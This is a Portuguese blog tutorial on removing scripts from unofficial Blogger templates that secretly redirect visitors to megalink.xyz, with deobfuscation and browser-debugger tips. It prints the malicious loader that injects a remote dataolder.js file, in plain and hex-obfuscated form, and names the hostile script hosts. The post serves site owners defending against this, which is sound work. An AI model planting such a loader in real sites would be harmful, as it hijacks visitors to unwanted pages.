---
title: Blogger redirecionando para o megalink.xyz
date: 2023-07-02
author: M4rQu1Nh0S
tags: [blogger, redirecionando, sozinho, megalink.xyz, automaticamente]
subtitle: Saiba como resolver esse redirecionamento indesejado
category: [Dicas e tutoriais, Blogger]
comments: true
#cover-img: /assets/img/path.jpg
thumbnail-img: https://cdn-images-1.medium.com/max/800/0*z0w7bAMjSkAMnzZr.png
share-img: https://cdn-images-1.medium.com/max/800/0*z0w7bAMjSkAMnzZr.png
layout: post
---

![](https://cdn-images-1.medium.com/max/800/0*z0w7bAMjSkAMnzZr.png)<br/>
Um problema que pode acontecer ao utilizar temas não oficiais do blogger, alguns temas possuem códigos que ocasionalmente faz com que as visitas no seu blog sejam automaticamente redirecionadas para um outro site. Tal problema que comecei a ter recentemente em um template do blogger que já vinha utilizando a muito tempo atrás.

Enfim, indo direto ao ponto, no meu caso o problema foi causado por 2 scripts que estavam no html do blog

	//commentid.com/dataolder.js

e

	//blogpager.com/dataolder.js

Na grande maioria das vezes, com esses dois scripts, seu blog é redirecionado para o site https:// **link.megalink.xyz**]

Portanto basta editar o código html do blogger e remover todas as linhas que contem esse **dataolder.js**

**Conteúdo**

1. [Pode acontecer desse script estar “disfarçado” no html](#pode-acontecer-desse-script-estar-disfarçado-no-html)
2. [“DesOfuscando” um código](#desofuscando-um-código)
3. [Como encontrar o script no html do blogger](#como-encontrar-o-script-no-html-do-blogger)
4. [Usando o debugger do browser para diagnóstico](#usando-o-debugger-do-browser-para-diagnóstico)
5. [Observações sobre o problema](#observações-sobre-o-problema)

## Pode acontecer desse script estar “disfarçado” no html
Existe uma espécie de codificação em linguagens de programação que “disfarçam” que podemos chamar de **ofuscador**.

O Ofuscador faz com que um código como esse:

```
<script type='text/javascript'>
_wau.push(["small", "00wy9zw057rt", "pd4"]);
(function () {
  var rahja = document.createElement("script");
  rahja.async = true;
  rahja.src = "//blogpager.com/dataolder.js";
  document.getElementsByTagName("head")[0].appendChild(rahja);
}());
</script>
```

Após ofuscado, o código fica assim:

```
<script type='text/javascript'>
var _0x603d=["\x73\x6D\x61\x6C\x6C","\x30\x30\x77\x79\x39\x7A\x77\x30\x35\x37\x72\x74","\x70\x64\x34","\x70\x75\x73\x68","\x73\x63\x72\x69\x70\x74","\x63\x72\x65\x61\x74\x65\x45\x6C\x65\x6D\x65\x6E\x74","\x61\x73\x79\x6E\x63","\x73\x72\x63","\x2F\x2F\x62\x6C\x6F\x67\x70\x61\x67\x65\x72\x2E\x63\x6F\x6D\x2F\x64\x61\x74\x61\x6F\x6C\x64\x65\x72\x2E\x6A\x73","\x61\x70\x70\x65\x6E\x64\x43\x68\x69\x6C\x64","\x68\x65\x61\x64","\x67\x65\x74\x45\x6C\x65\x6D\x65\x6E\x74\x73\x42\x79\x54\x61\x67\x4E\x61\x6D\x65"];var _wau=_wau|| [];_wau[_0x603d[3]]([_0x603d[0],_0x603d[1],_0x603d[2]]);(function(){var _0xcefcx2=document[_0x603d[5]](_0x603d[4]);_0xcefcx2[_0x603d[6]]= true;_0xcefcx2[_0x603d[7]]= _0x603d[8];document[_0x603d[11]](_0x603d[10])[0][_0x603d[9]](_0xcefcx2)})()
</script>
```

Uma vez que o código esteja ofuscado, você não vai conseguir encontrar o script e daí não conseguirá acabar com a fonte dos redirecionamentos.

## “DesOfuscando” um código

Felizmente existem ferramentas que ajudam a desofuscar, pelo menos parcialmente, um código que está ofuscado.

Vou recomendar alguns exemplos abaixo:

-   [**https://www.seosniffer.com/javascript-deobfuscator**](https://www.seosniffer.com/javascript-deobfuscator)
-   [https://deo.sigr.io/](https://deo.sigr.io/)
-   [https://www.dcode.fr/javascript-unobfuscator](https://www.dcode.fr/javascript-unobfuscator)
-   [https://coderstoolbox.net/string/#!encoding=xml&action=decode&charset=us_ascii](https://coderstoolbox.net/string/#!encoding=xml&action=decode&charset=us_ascii)
    (para traduzir alguns caracteres xml para html e daí desofuscar)

## Como encontrar o script no html do blogger
Agora que já expliquei como identificar um código ofuscado e também ja falei que o script que faz os redirecionamentos (dataolder.js), basta editar o html do blogger.

Abra o painel do blogger e vá nas opções de editar o html, e então use o Ctrl + F e procure por:

	<script type='text/javascript'>

No meio dos resultados você vai encontrar alguns códigos ofuscados, basta pega-los e desofusca-los e observar se tem algo no meio desse código alguma função de redirecionamento.

Ao encontrar basta remover, mas atenção, nem todo código ofuscado vai ter um script de redirecionamento! Alguns autores ofuscam o código para proteger o seu tema de plágio e por isso alguns códigos ofuscados podem apenas conter funções especificas do tema, como animações, estilos de fontes e cores, etc.

## Usando o debugger do browser para diagnóstico.
Todo browser ou a maioria tem as ferramentas de desenvolvedor, no caso do Chrome ele aparece ao pressionar **F12**.

Dá pra usar essa ferramenta para ajudar a encontrar a fonte dos redirecionamentos que está acontecendo no seu blogger.

Basta apertar F12 e seguir os procedimentos:

- Habilitar a visualização mobile
- Na opção **Network**, marcar as opções **Preserve Log** e **Block Requests**
- Na lista **Name** vai haver várias solicitações, ao clicar em uma da lista, observe a guia **Initiator**, ela informa em qual parte do site saiu a solicitação, que no caso é de redirecionamento.

![](https://cdn-images-1.medium.com/max/800/1*vK9hdmPcOOm8Z-3bnHtzbA.png)

## Observações sobre o problema
Curiosamente esse tipo de problema acontece principalmente quando o blog é aberto por um browser mobile ou em modo mobile, em modo computador o redirecionamento não acontece todas as vezes.

Pelo visto os scripts de redirecionamento foram programas para atuarem com mais tendencia em celulares, por tanto quando for investigar as fontes do redirecionamento que está acontecendo no seu blog, experimente faze-lo com o blog aberto em modo mobile.

